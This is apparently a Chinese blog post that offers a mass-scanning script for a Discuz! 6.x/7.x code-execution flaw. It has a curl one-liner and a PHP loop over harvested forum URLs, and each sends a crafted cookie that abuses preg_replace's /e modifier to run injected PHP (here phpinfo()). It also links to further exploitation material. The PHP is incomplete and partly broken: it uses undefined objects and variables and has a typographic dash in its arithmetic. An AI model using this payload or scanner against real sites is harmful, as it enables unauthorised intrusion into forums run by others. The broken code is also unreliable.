---
title: Discuz! 6.x/7.x 批量检测脚本
date: 2014-11-25 03:05 
tags: php代码控
---

>用法 先 用抓取url工具 抓取 若干 url (url为 带表情的帖子，或回复)
存放至 dz.txt 文件 然后执行本脚本

[漏洞利用请关注](https://www.t00ls.net/viewthread.php?tid=28573&extra=&page=9) 第82楼

**单个测试语句(windows)：**

```bash
curl 'http://bbs.test.com/viewthread.php?tid=29958' -s --cookie 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();' |findstr /i /c:'<h2>PHP License</h2>'
```

有返回说明有洞


```php
<?php

$rc->__set('time_out', $timeout); //设置超时时间

$urls=file('dz.txt');

foreach ($urls as $url) {
//$url=trim($url);
$request = new RollingCurlRequest(trim($url));
$request->options = array(CURLOPT_HTTPHEADER => array('Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'));

$rc->add($request);
}
$rc->execute();
//时间统计函数
function func_time()
{
list($microsec, $sec) = explode(' ', microtime());
return $microsec + $sec;
}

echo '\r\n'.'time: ' . round((func_time() – $start_time), 4) . 'sec ';
?>
```